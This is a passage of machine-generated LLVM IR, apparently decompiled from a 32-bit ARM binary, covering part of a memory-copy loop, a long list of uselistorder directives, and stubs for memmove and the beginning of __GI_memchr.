  %v6_14de4 = load i32, i32* %v5_14de4, align 4
  store i32 %v6_14de4, i32* %r4.global-to-local, align 4
  %v7_14de4 = add i32 %v0_14de4, -12
  %v8_14de4 = inttoptr i32 %v7_14de4 to i32*
  %v9_14de4 = load i32, i32* %v8_14de4, align 4
  store i32 %v9_14de4, i32* %r5.global-to-local, align 4
  %v10_14de4 = add i32 %v0_14de4, -16
  %v11_14de4 = inttoptr i32 %v10_14de4 to i32*
  %v12_14de4 = load i32, i32* %v11_14de4, align 4
  store i32 %v10_14de4, i32* %r1.global-to-local, align 4
  %v4_14de8 = udiv i32 %v12_14de4, 65536
  %v5_14de8 = or i32 %v4_14de8, %v3_14de0
  store i32 %v5_14de8, i32* %lr.global-to-local, align 4
  %v3_14dec = mul i32 %v12_14de4, 65536
  %v4_14df0 = udiv i32 %v9_14de4, 65536
  %v5_14df0 = or i32 %v3_14dec, %v4_14df0
  store i32 %v5_14df0, i32* @ip, align 4
  %v3_14df4 = mul i32 %v9_14de4, 65536
  %v4_14df8 = udiv i32 %v6_14de4, 65536
  %v5_14df8 = or i32 %v3_14df4, %v4_14df8
  store i32 %v5_14df8, i32* %r5.global-to-local, align 4
  %v3_14dfc = mul i32 %v6_14de4, 65536
  %v4_14e00 = udiv i32 %v3_14de4, 65536
  %v5_14e00 = or i32 %v3_14dfc, %v4_14e00
  store i32 %v5_14e00, i32* %r4.global-to-local, align 4
  %v1_14e04 = add i32 %v0_14e04, -16
  %v2_14e04 = inttoptr i32 %v1_14e04 to i32*
  store i32 %v5_14e00, i32* %v2_14e04, align 4
  %v4_14e04 = add i32 %v0_14e04, -12
  %v5_14e04 = inttoptr i32 %v4_14e04 to i32*
  %v6_14e04 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14e04, i32* %v5_14e04, align 4
  %v7_14e04 = add i32 %v0_14e04, -8
  %v8_14e04 = inttoptr i32 %v7_14e04 to i32*
  %v9_14e04 = load i32, i32* @ip, align 4
  store i32 %v9_14e04, i32* %v8_14e04, align 4
  %v10_14e04 = add i32 %v0_14e04, -4
  %v11_14e04 = inttoptr i32 %v10_14e04 to i32*
  %v12_14e04 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e04, i32* %v11_14e04, align 4
  store i32 %v1_14e04, i32* %r0.global-to-local, align 4
  %v0_14e08 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e08 = add i32 %v0_14e08, -16
  store i32 %v2_14e08, i32* %r2.global-to-local, align 4
  %v6_14e0c = icmp slt i32 %v0_14e08, 16
  br i1 %v6_14e0c, label %dec_label_pc_14e10, label %dec_label_pc_14de0.dec_label_pc_14de0_crit_edge

dec_label_pc_14de0.dec_label_pc_14de0_crit_edge:  ; preds = %dec_label_pc_14de0
  %v0_14de0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14de4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14e10:                               ; preds = %dec_label_pc_14de0
  %v2_14e10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14e10, i32* @r4, align 4
  %v5_14e10 = load i8*, i8** %stack_var_-8, align 4
  %v6_14e10 = ptrtoint i8* %v5_14e10 to i32
  store i32 %v6_14e10, i32* @r5, align 4
  store i32 %v11_14ddc, i32* @lr, align 4
  %v2_14e14 = add i32 %v0_14e08, -4
  store i32 %v2_14e14, i32* %r2.global-to-local, align 4
  %v4_14e14 = add i32 %v0_14e08, 2147483632
  %v5_14e14 = and i32 %v2_14e14, %v4_14e14
  %v6_14e14 = icmp slt i32 %v5_14e14, 0
  store i1 %v6_14e14, i1* %cpsr_v.global-to-local, align 1
  %v7_14e14 = icmp slt i32 %v2_14e14, 0
  store i1 %v7_14e14, i1* %cpsr_n.global-to-local, align 1
  %v5_14e18 = icmp slt i32 %v2_14e08, -12
  br i1 %v5_14e18, label %dec_label_pc_14e34, label %dec_label_pc_14e1c

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e10, %dec_label_pc_14dd0, %dec_label_pc_14e1c
  %v1_14e28 = phi i32 [ %v5_14e28, %dec_label_pc_14e1c ], [ %v1_14e04, %dec_label_pc_14e10 ], [ %v0_14d9831, %dec_label_pc_14dd0 ]
  %v0_14e1c = load i32, i32* %r3.global-to-local, align 4
  %v3_14e1c = mul i32 %v0_14e1c, 65536
  store i32 %v3_14e1c, i32* %ip.global-to-local, align 4
  %v0_14e20 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e20 = add i32 %v0_14e20, -4
  %v2_14e20 = inttoptr i32 %v1_14e20 to i32*
  %v3_14e20 = load i32, i32* %v2_14e20, align 4
  store i32 %v3_14e20, i32* %r3.global-to-local, align 4
  store i32 %v1_14e20, i32* %r1.global-to-local, align 4
  %v4_14e24 = udiv i32 %v3_14e20, 65536
  %v5_14e24 = or i32 %v4_14e24, %v3_14e1c
  store i32 %v5_14e24, i32* @ip, align 4
  %v2_14e28 = add i32 %v1_14e28, -4
  %v3_14e28 = inttoptr i32 %v2_14e28 to i32*
  store i32 %v5_14e24, i32* %v3_14e28, align 4
  %v4_14e28 = load i32, i32* %r0.global-to-local, align 4
  %v5_14e28 = add i32 %v4_14e28, -4
  store i32 %v5_14e28, i32* %r0.global-to-local, align 4
  %v0_14e2c = load i32, i32* %r2.global-to-local, align 4
  %v2_14e2c = add i32 %v0_14e2c, -4
  store i32 %v2_14e2c, i32* %r2.global-to-local, align 4
  %v6_14e30 = icmp slt i32 %v0_14e2c, 4
  br i1 %v6_14e30, label %dec_label_pc_14e34.loopexit, label %dec_label_pc_14e1c

dec_label_pc_14e34.loopexit:                      ; preds = %dec_label_pc_14e1c
  %v4_14e2c = sub i32 3, %v0_14e2c
  %v5_14e2c = and i32 %v4_14e2c, %v0_14e2c
  %v6_14e2c = icmp slt i32 %v5_14e2c, 0
  %v7_14e2c = icmp slt i32 %v2_14e2c, 0
  store i1 %v6_14e2c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14e2c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14e34

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e34.loopexit, %dec_label_pc_14e10
  %v2_14d0c64 = phi i32 [ %v5_14e28, %dec_label_pc_14e34.loopexit ], [ %v1_14e04, %dec_label_pc_14e10 ]
  %v0_14cfc60 = phi i32 [ %v2_14e2c, %dec_label_pc_14e34.loopexit ], [ %v2_14e14, %dec_label_pc_14e10 ]
  %v0_14e34 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e34 = add i32 %v0_14e34, 2
  store i32 %v1_14e34, i32* @r1, align 4
  br label %bb143

dec_label_pc_14e3c:                               ; preds = %dec_label_pc_14d50
  br i1 %v5_14e40, label %dec_label_pc_14e88, label %dec_label_pc_14e44

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14e3c
  store i32 %v2_14e3c, i32* %r2.global-to-local, align 4
  %v3_14e48 = load i32, i32* @r4, align 4
  store i32 %v3_14e48, i32* %stack_var_-12, align 4
  %v6_14e48 = load i32, i32* @r5, align 4
  %v8_14e48 = inttoptr i32 %v6_14e48 to i8*
  store i8* %v8_14e48, i8** %stack_var_-8, align 4
  %v11_14e48 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e4c:                               ; preds = %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge, %dec_label_pc_14e44
  %v0_14e70 = phi i32 [ %v1_14e70, %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge ], [ %v0_14d9831, %dec_label_pc_14e44 ]
  %v0_14e50 = phi i32 [ %v0_14e50.pre, %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge ], [ %v1_14d50, %dec_label_pc_14e44 ]
  %v0_14e4c = phi i32 [ %v0_14e4c.pre, %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge ], [ %v2_14d54, %dec_label_pc_14e44 ]
  %v3_14e4c = mul i32 %v0_14e4c, 16777216
  store i32 %v3_14e4c, i32* %lr.global-to-local, align 4
  %v1_14e50 = add i32 %v0_14e50, -4
  %v2_14e50 = inttoptr i32 %v1_14e50 to i32*
  %v3_14e50 = load i32, i32* %v2_14e50, align 4
  store i32 %v3_14e50, i32* %r3.global-to-local, align 4
  %v4_14e50 = add i32 %v0_14e50, -8
  %v5_14e50 = inttoptr i32 %v4_14e50 to i32*
  %v6_14e50 = load i32, i32* %v5_14e50, align 4
  store i32 %v6_14e50, i32* %r4.global-to-local, align 4
  %v7_14e50 = add i32 %v0_14e50, -12
  %v8_14e50 = inttoptr i32 %v7_14e50 to i32*
  %v9_14e50 = load i32, i32* %v8_14e50, align 4
  store i32 %v9_14e50, i32* %r5.global-to-local, align 4
  %v10_14e50 = add i32 %v0_14e50, -16
  %v11_14e50 = inttoptr i32 %v10_14e50 to i32*
  %v12_14e50 = load i32, i32* %v11_14e50, align 4
  store i32 %v10_14e50, i32* %r1.global-to-local, align 4
  %v4_14e54 = udiv i32 %v12_14e50, 256
  %v5_14e54 = or i32 %v4_14e54, %v3_14e4c
  store i32 %v5_14e54, i32* %lr.global-to-local, align 4
  %v3_14e58 = mul i32 %v12_14e50, 16777216
  %v4_14e5c = udiv i32 %v9_14e50, 256
  %v5_14e5c = or i32 %v3_14e58, %v4_14e5c
  store i32 %v5_14e5c, i32* @ip, align 4
  %v3_14e60 = mul i32 %v9_14e50, 16777216
  %v4_14e64 = udiv i32 %v6_14e50, 256
  %v5_14e64 = or i32 %v3_14e60, %v4_14e64
  store i32 %v5_14e64, i32* %r5.global-to-local, align 4
  %v3_14e68 = mul i32 %v6_14e50, 16777216
  %v4_14e6c = udiv i32 %v3_14e50, 256
  %v5_14e6c = or i32 %v3_14e68, %v4_14e6c
  store i32 %v5_14e6c, i32* %r4.global-to-local, align 4
  %v1_14e70 = add i32 %v0_14e70, -16
  %v2_14e70 = inttoptr i32 %v1_14e70 to i32*
  store i32 %v5_14e6c, i32* %v2_14e70, align 4
  %v4_14e70 = add i32 %v0_14e70, -12
  %v5_14e70 = inttoptr i32 %v4_14e70 to i32*
  %v6_14e70 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14e70, i32* %v5_14e70, align 4
  %v7_14e70 = add i32 %v0_14e70, -8
  %v8_14e70 = inttoptr i32 %v7_14e70 to i32*
  %v9_14e70 = load i32, i32* @ip, align 4
  store i32 %v9_14e70, i32* %v8_14e70, align 4
  %v10_14e70 = add i32 %v0_14e70, -4
  %v11_14e70 = inttoptr i32 %v10_14e70 to i32*
  %v12_14e70 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14e70, i32* %v11_14e70, align 4
  store i32 %v1_14e70, i32* %r0.global-to-local, align 4
  %v0_14e74 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e74 = add i32 %v0_14e74, -16
  store i32 %v2_14e74, i32* %r2.global-to-local, align 4
  %v6_14e78 = icmp slt i32 %v0_14e74, 16
  br i1 %v6_14e78, label %dec_label_pc_14e7c, label %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge

dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge:  ; preds = %dec_label_pc_14e4c
  %v0_14e4c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14e50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e7c:                               ; preds = %dec_label_pc_14e4c
  %v2_14e7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14e7c, i32* @r4, align 4
  %v5_14e7c = load i8*, i8** %stack_var_-8, align 4
  %v6_14e7c = ptrtoint i8* %v5_14e7c to i32
  store i32 %v6_14e7c, i32* @r5, align 4
  store i32 %v11_14e48, i32* @lr, align 4
  %v2_14e80 = add i32 %v0_14e74, -4
  store i32 %v2_14e80, i32* %r2.global-to-local, align 4
  %v4_14e80 = add i32 %v0_14e74, 2147483632
  %v5_14e80 = and i32 %v2_14e80, %v4_14e80
  %v6_14e80 = icmp slt i32 %v5_14e80, 0
  store i1 %v6_14e80, i1* %cpsr_v.global-to-local, align 1
  %v7_14e80 = icmp slt i32 %v2_14e80, 0
  store i1 %v7_14e80, i1* %cpsr_n.global-to-local, align 1
  %v5_14e84 = icmp slt i32 %v2_14e74, -12
  br i1 %v5_14e84, label %dec_label_pc_14ea0, label %dec_label_pc_14e88

dec_label_pc_14e88:                               ; preds = %dec_label_pc_14e7c, %dec_label_pc_14e3c, %dec_label_pc_14e88
  %v1_14e94 = phi i32 [ %v5_14e94, %dec_label_pc_14e88 ], [ %v1_14e70, %dec_label_pc_14e7c ], [ %v0_14d9831, %dec_label_pc_14e3c ]
  %v0_14e88 = load i32, i32* %r3.global-to-local, align 4
  %v3_14e88 = mul i32 %v0_14e88, 16777216
  store i32 %v3_14e88, i32* %ip.global-to-local, align 4
  %v0_14e8c = load i32, i32* %r1.global-to-local, align 4
  %v1_14e8c = add i32 %v0_14e8c, -4
  %v2_14e8c = inttoptr i32 %v1_14e8c to i32*
  %v3_14e8c = load i32, i32* %v2_14e8c, align 4
  store i32 %v3_14e8c, i32* %r3.global-to-local, align 4
  store i32 %v1_14e8c, i32* %r1.global-to-local, align 4
  %v4_14e90 = udiv i32 %v3_14e8c, 256
  %v5_14e90 = or i32 %v4_14e90, %v3_14e88
  store i32 %v5_14e90, i32* @ip, align 4
  %v2_14e94 = add i32 %v1_14e94, -4
  %v3_14e94 = inttoptr i32 %v2_14e94 to i32*
  store i32 %v5_14e90, i32* %v3_14e94, align 4
  %v4_14e94 = load i32, i32* %r0.global-to-local, align 4
  %v5_14e94 = add i32 %v4_14e94, -4
  store i32 %v5_14e94, i32* %r0.global-to-local, align 4
  %v0_14e98 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e98 = add i32 %v0_14e98, -4
  store i32 %v2_14e98, i32* %r2.global-to-local, align 4
  %v6_14e9c = icmp slt i32 %v0_14e98, 4
  br i1 %v6_14e9c, label %dec_label_pc_14ea0.loopexit, label %dec_label_pc_14e88

dec_label_pc_14ea0.loopexit:                      ; preds = %dec_label_pc_14e88
  %v4_14e98 = sub i32 3, %v0_14e98
  %v5_14e98 = and i32 %v4_14e98, %v0_14e98
  %v6_14e98 = icmp slt i32 %v5_14e98, 0
  %v7_14e98 = icmp slt i32 %v2_14e98, 0
  store i1 %v6_14e98, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14e98, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14ea0

dec_label_pc_14ea0:                               ; preds = %dec_label_pc_14ea0.loopexit, %dec_label_pc_14e7c
  %v2_14d0c65 = phi i32 [ %v5_14e94, %dec_label_pc_14ea0.loopexit ], [ %v1_14e70, %dec_label_pc_14e7c ]
  %v0_14cfc61 = phi i32 [ %v2_14e98, %dec_label_pc_14ea0.loopexit ], [ %v2_14e80, %dec_label_pc_14e7c ]
  %v0_14ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ea0 = add i32 %v0_14ea0, 1
  store i32 %v1_14ea0, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_14e94, { 0, 2, 1 }
  uselistorder i32 %v3_14e88, { 1, 0 }
  uselistorder i32 %v2_14e80, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14e70, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14e50, { 1, 0 }
  uselistorder i32 %v3_14e4c, { 1, 0 }
  uselistorder i32 %v0_14e50, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14e70, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14e28, { 0, 2, 1 }
  uselistorder i32 %v3_14e1c, { 1, 0 }
  uselistorder i32 %v2_14e14, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14e04, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14de4, { 1, 0 }
  uselistorder i32 %v3_14de0, { 1, 0 }
  uselistorder i32 %v0_14de4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14e04, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14dbc, { 0, 2, 1 }
  uselistorder i32 %v3_14db0, { 1, 0 }
  uselistorder i32 %v2_14da8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14d98, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14d78, { 1, 0 }
  uselistorder i32 %v3_14d74, { 1, 0 }
  uselistorder i32 %v0_14d78, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14d98, { 3, 2, 1, 0 }
  uselistorder i1 %v5_14e40, { 2, 0, 1 }
  uselistorder i32 %v0_14d58, { 1, 0 }
  uselistorder i32 %v0_14e44, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14d9831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14d48, { 2, 1, 0 }
  uselistorder i32 %v0_14d48, { 2, 0, 1 }
  uselistorder i32 %v2_14d40, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14d40, { 1, 0, 2 }
  uselistorder i32 %v0_14d40, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14d9832, { 2, 1, 0 }
  uselistorder i32 %v11_14d1c, { 1, 0 }
  uselistorder i32 %v7_14d1c, { 1, 0 }
  uselistorder i32 %v1_14cfc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14cfc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14d00, { 1, 0 }
  uselistorder i32 %v7_14cf4, { 0, 2, 1 }
  uselistorder i32 %v10_14cf0, { 1, 0 }
  uselistorder i32 %v9_14ce8, { 1, 0, 2 }
  uselistorder i32 %v6_14ce4, { 1, 0 }
  uselistorder i32 %v2_14cdc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14cdc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14cec, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14cd0, { 0, 2, 1 }
  uselistorder i32 %v13_14ccc, { 1, 0 }
  uselistorder i32 %v4_14cc8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_14cc8, { 2, 0, 1 }
  uselistorder i32 %v6_14cd0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14cc0, { 0, 2, 1 }
  uselistorder i32 %v16_14cbc, { 1, 0 }
  uselistorder i32 %v4_14cb8, { 1, 0 }
  uselistorder i32 %v0_14cc8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_14cc0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14cac, { 0, 3, 2, 1 }
  uselistorder i32 %v10_14ca8, { 1, 0 }
  uselistorder i32 %v1_14ca4, { 1, 0 }
  uselistorder i32 %v10_14ca0, { 1, 0 }
  uselistorder i32 %v0_14ca0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14ca4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_14c98, { 0, 2, 1 }
  uselistorder i32 %v2_14c8c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14c8c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_14ca449, { 1, 2, 0 }
  uselistorder i32 %v1_14c84, { 2, 1, 0 }
  uselistorder i32 %v1_14c7c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_14c74, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_14c70, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_14c6c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_14c6c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_14c58, { 0, 2, 1 }
  uselistorder i32 %v3_14c4c, { 1, 0 }
  uselistorder i32 %v2_14c44, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14c34, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14c14, { 1, 0, 2 }
  uselistorder i32 %v5_14c14, { 1, 0, 2 }
  uselistorder i32 %v2_14c14, { 1, 0, 2 }
  uselistorder i32 %v3_14c10, { 1, 0 }
  uselistorder i32 %v0_14c14, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14c34, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14bec, { 0, 2, 1 }
  uselistorder i32 %v3_14be0, { 1, 0 }
  uselistorder i32 %v2_14bd8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14bc8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14ba8, { 1, 0, 2 }
  uselistorder i32 %v5_14ba8, { 1, 0, 2 }
  uselistorder i32 %v2_14ba8, { 1, 0, 2 }
  uselistorder i32 %v3_14ba4, { 1, 0 }
  uselistorder i32 %v0_14ba8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14bc8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14b80, { 0, 2, 1 }
  uselistorder i32 %v3_14b74, { 1, 0 }
  uselistorder i32 %v2_14b6c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14b5c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14b3c, { 1, 0, 2 }
  uselistorder i32 %v5_14b3c, { 1, 0, 2 }
  uselistorder i32 %v2_14b3c, { 1, 0, 2 }
  uselistorder i32 %v3_14b38, { 1, 0 }
  uselistorder i32 %v0_14b3c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14b5c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_14c04, { 2, 0, 1 }
  uselistorder i32 %v0_14c08, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14b5c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14b0c, { 1, 0 }
  uselistorder i32 %v0_14b0c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14b04, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14b04, { 1, 0, 2 }
  uselistorder i32 %v0_14b04, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14b5c76, { 2, 1, 0 }
  uselistorder i32 %v1_14ae4, { 1, 0, 2 }
  uselistorder i32 %v1_14abc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14abc, { 1, 2, 0, 3 }
  uselistorder i32 %v8_14aa8, { 1, 0, 2 }
  uselistorder i32 %v6_14aa4, { 1, 0 }
  uselistorder i32 %v2_14a9c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14a9c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14aac, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_14a94, { 0, 2, 1 }
  uselistorder i1 %v0_14a94, { 1, 0 }
  uselistorder i1 %v1_14a94, { 1, 0 }
  uselistorder i32 %v3_14a90, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14a88, { 0, 2, 1, 3 }
  uselistorder i32 %v4_14a74, { 1, 0 }
  uselistorder i32 %v12_14a68, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14a5c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14a60, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_14a50, { 0, 2, 1 }
  uselistorder i32 %v2_14a48, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14a48, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_14a40, { 1, 0 }
  uselistorder i32 %v1_14a38, { 2, 1, 0 }
  uselistorder i32 %v2_14a30, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_14a30, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14a20, { 1, 0 }
  uselistorder i32 %v1_14a20, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_14a20, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 6, 7, 1, 9, 0, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 2, 41, 3, 24, 4, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 7, 2, 9, 0, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 6, 22, 23, 24, 25, 26, 3, 47, 4, 27, 5, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_14e88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14db0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d50, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_14cdc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_14ca0, { 1, 0 }
  uselistorder label %dec_label_pc_14c8c, { 1, 0 }
  uselistorder label %dec_label_pc_14c4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14be0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b14, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_14a88, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14a48, { 1, 0 }
}

define i32 @function_14ea8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ea8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_14eb0 = load i32, i32* @r0, align 4
  %v1_14eb0 = load i32, i32* @r1, align 4
  %v2_14eb0 = inttoptr i32 %v0_14eb0 to i8*
  %v3_14eb0 = call i32 @_memcpy(i8* %v2_14eb0, i32 %v1_14eb0)
  ret i32 %v3_14eb0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_14ec0 = load i32, i32* @r4, align 4
  %v6_14ec0 = load i32, i32* @r5, align 4
  %v9_14ec0 = load i32, i32* @r6, align 4
  %v1_14ec4 = urem i32 %arg1, 256
  %v0_14ee018 = load i32, i32* @r2, align 4
  %v2_14ee020 = icmp eq i32 %v0_14ee018, 0
  br i1 %v2_14ee020, label %dec_label_pc_14ef0, label %dec_label_pc_14ee8

